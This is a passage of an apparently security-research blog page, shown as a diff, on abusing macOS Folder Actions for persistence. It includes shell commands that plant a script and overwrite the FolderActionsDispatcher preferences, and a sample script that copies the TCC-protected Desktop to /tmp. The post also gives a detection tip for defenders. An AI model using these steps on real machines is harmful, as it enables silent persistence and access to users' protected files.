+		AAAEAwAAnx0GAAMAAAAIAAAABAMAAKAdBgADAAAACAAAAAQDAACtHQYAAwAA
+		ABgAAAABBgAArAAAALwAAADMAAAA3AAAAOwAAAD8AAAACAAAAAAEAABBw6vO
+		IggBaBgAAAABAgAAAQAAAAAAAAAPAAAAAAAAAAAAAAAAAAAACAAAAAQDAAAE
+		AAAAAAAAAAQAAAADAwAA9QEAAAgAAAABCQAAZmlsZTovLy8MAAAAAQEAAE1h
+		Y2ludG9zaCBIRAgAAAAEAwAAAJAvUAkAAAAIAAAAAAQAAEHDjpDvAAAAJAAA
+		AAEBAAAwQTgxRjNCMS01MUQ5LTMzMzUtQjNFMy0xNjlDMzY0MDM2MEQYAAAA
+		AQIAAIEAAAABAAAA7xMAAAEAAAAAAAAAAAAAAAEAAAABAQAALwAAAAAAAAAB
+		BQAA9gAAAAECAAAwOTRiZDU2MmIwZTAyYWQ2ZDk4ODdhNjdhZGRhMDRjNGU3
+		ODRlZWI0ZmJhYTUyOGRjMDQzZjhhNTQ4ZTc1MDQyOzAwOzAwMDAwMDAwOzAw
+		MDAwMDAwOzAwMDAwMDAwOzAwMDAwMDAwMDAwMDAwMjA7Y29tLmFwcGxlLmFw
+		cC1zYW5kYm94LnJlYWQtd3JpdGU7MDE7MDEwMDAwMDY7MDAwMDAwMDMwMDA2
+		MWRhZDswMTsvdXNlcnMvY3NhYnkvbGlicmFyeS9zY3JpcHRzL2ZvbGRlciBh
+		Y3Rpb24gc2NyaXB0cy9mb2xkZXJhY3Rpb24uc2NwdAAAANgAAAD+////AQAA
+		AAAAAAARAAAABBAAAIwAAAAAAAAABRAAAAwBAAAAAAAAEBAAADwBAAAAAAAA
+		QBAAACwBAAAAAAAAAiAAAAgCAAAAAAAABSAAAHgBAAAAAAAAECAAAIgBAAAA
+		AAAAESAAALwBAAAAAAAAEiAAAJwBAAAAAAAAEyAAAKwBAAAAAAAAICAAAOgB
+		AAAAAAAAMCAAABQCAAAAAAAAAcAAAFwBAAAAAAAAEcAAACAAAAAAAAAAEsAA
+		AGwBAAAAAAAAENAAAAQAAAAAAAAAgPAAABwCAAAAAAAA
+		<span style="color:#309;font-weight:bold">&lt;/data&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>folderaction.scpt<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classes<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalScript<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSObject<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classname<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalScript<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classes<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalFolderAction<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSObject<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classname<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalFolderAction<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$top<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;key&gt;</span>root<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+			<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>1<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$version<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+	<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>100000<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+<span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
+</code></pre></div><p>More embedded data! :( If we decode the new base64 strings, we will again get a binary plist. Unfortunately <code>plutil</code> can&rsquo;t convert it, and throws an error but if we take a look it will contain further info about the folders we set and the script.</p>
+<p>I didn&rsquo;t want to fully reverse the structure of this plist, but simply take a shortcut. We can setup a folder action script on our machine, like the above and take it to the victim.</p>
+<p>Taking the above plist we can overwrite the one on the machine. There is zero protection on the file, so we can freely do that.</p>
+<p>So the manual setup is to copy our script to its location, create the folder we want to watch (if it doesn&rsquo;t exists), and overwrite preferences.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">csaby@mantarey ~ % mkdir -p <span style="color:#c30">&#34;Library/Scripts/Folder Action Scripts&#34;</span>
+csaby@mantarey ~ % cp folderaction.scpt <span style="color:#c30">&#34;Library/Scripts/Folder Action Scripts/&#34;</span> 
+csaby@mantarey ~ % mkdir <span style="color:#366">test</span>
+csaby@mantarey ~ % cp com.apple.FolderActionsDispatcher.plist Library/Preferences 
+</code></pre></div><p>We could also do something like this to edit the preferences file:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">defaults write <span style="color:#c30">&#34;com.apple.FolderActionsDispatcher&#34;</span> <span style="color:#c30">&#34;folderActions&#34;</span> <span style="color:#c30">&#39;&#34;{length = 2513, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 00000935 }&#34;&#39;</span>
+</code></pre></div><p>In this case, for the example, our folder action script does the following:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#069;font-weight:bold">var</span> app <span style="color:#555">=</span> Application.currentApplication();
+app.includeStandardAdditions <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">true</span>;
+app.doShellScript(<span style="color:#c30">&#34;touch /tmp/folderaction.txt&#34;</span>);
+app.doShellScript(<span style="color:#c30">&#34;touch ~/Desktop/folderaction.txt&#34;</span>);
+app.doShellScript(<span style="color:#c30">&#34;cp -R ~/Desktop /tmp/&#34;</span>);
+</code></pre></div><p>Now if we do anything in the folder&hellip;. nothing happens. :(</p>
+<p>There is one more thing we need to do. The preference file has to be consumed, and for that we need to start the <code>Folder Action Setup.app</code> utility, which we can kill after.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">csaby@mantarey ~ % open <span style="color:#c30">&#34;/System/Library/CoreServices/Applications/Folder Actions Setup.app/&#34;</span>                                 
+csaby@mantarey ~ % killall <span style="color:#c30">&#34;Folder Actions Setup&#34;</span>
+</code></pre></div><p>Now if we do anything with it in Finder, the script will be triggered. All of this without any user prompt.</p>
+<p>Someone can either prepare a PLIST file upfront as I did here, or reverse it and programmatically do it. I didn&rsquo;t do that, but if anyone does I would be interested seeing that :)</p>
+<h2 id="tcc-implication">TCC implication</h2>
+<p>As you might have noticed, I made a command to copy all files from the <code>~/Desktop</code> into <code>/tmp/</code>. As <code>Desktop</code> is protected by TCC it&rsquo;s interesting to observe what happens. The script is not executed by Finder but  <code>FolderActionDispatcher</code>.</p>
+<p><code>FolderActionsDispatcher</code> has an entitlement which allows it to prompt for all TCC permissions.</p>
+<pre tabindex="0"><code>Executable=/System/Library/CoreServices/FolderActionsDispatcher.app/Contents/MacOS/FolderActionsDispatcher
+Identifier=com.apple.FolderActionsDispatcher
+Format=app bundle with Mach-O universal (x86_64 arm64e)
+CodeDirectory v=20400 size=1210 flags=0x0(none) hashes=27+7 location=embedded
+Platform identifier=13
+Signature size=4442
+Signed Time=2021. Oct 2. 8:44:20
+Info.plist entries=27
+TeamIdentifier=not set
+Sealed Resources version=2 rules=2 files=0
+Internal requirements count=1 size=84
+[Dict]
+	[Key] com.apple.private.tcc.allow-prompting
+	[Value]
+		[Array]
+			[String] kTCCServiceAll
+	[Key] com.apple.application-identifier
+	[Value]
+		[String] com.apple.FolderActionsDispatcher
+</code></pre><p>This means that when our script is executed, <code>FolderActionDispatcher</code> will be the ultimate responsible process, and it will prompt the user. I think this is minimum misleading, and a less security aware user can click OK, without being aware at all what happens.</p>
+<p><img src="https://theevilbit.github.io/images/beyond/beyond_0024_0.png" alt="TCC Prompt"></p>
+<h2 id="script-execution-flow">Script Execution Flow</h2>
+<p>Our script is executed in the following way. The process <code>FolderActionDispatcher</code> will make an XPC request to  <code>com.apple.foundation.UserScriptService</code> which will invoke <code>osascript</code> which will invoke our shell commands. Thus ultimately the binary <code>/System/Library/Frameworks/Foundation.framework/Versions/C/XPCServices/com.apple.foundation.UserScriptService.xpc/Contents/MacOS/com.apple.foundation.UserScriptService</code> is launching the script.</p>
+<p>For blue teams I think there is a great way to monitor for this persistence: is anything launched by <code>com.apple.foundation.UserScriptService</code>?</p>
+<p>That&rsquo;s all I wanted to add this, again I highly recommend checking out Cody&rsquo;s blogpost.</p>
+
+      </div>
+
+      <footer>
+        
+
+
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+     © 2021
+    
+       · 
+      Blog created by <a href="https://twitter.com/theevilbit">@theevilbit</a>.
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-151008930-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  </body>
+
+</html>
